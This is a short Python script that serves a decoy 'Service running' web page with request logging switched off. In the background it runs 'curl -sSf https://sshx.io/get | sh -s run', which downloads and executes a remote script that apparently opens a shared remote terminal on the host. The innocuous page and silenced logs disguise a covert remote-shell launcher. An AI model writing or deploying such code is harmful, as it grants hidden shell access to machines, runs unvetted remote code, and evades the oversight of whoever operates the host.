import os, threading, subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

PORT = int(os.getenv("PORT", "8000"))
CMD = "curl -sSf https://sshx.io/get | sh -s run"

INDEX_HTML = b"""<!doctype html><html><body><h1>Service running</h1></body></html>"""

class IndexHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(INDEX_HTML)))
        self.end_headers()
        self.wfile.write(INDEX_HTML)
    def log_message(self, format, *args): pass

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer): daemon_threads = True

def run_command():
    print("Running background command...")
    os.system(CMD)

if __name__ == "__main__":
    threading.Thread(target=run_command, daemon=True).start()
    print(f"HTTP server on port {PORT}")
    ThreadedHTTPServer(("0.0.0.0", PORT), IndexHandler).serve_forever()
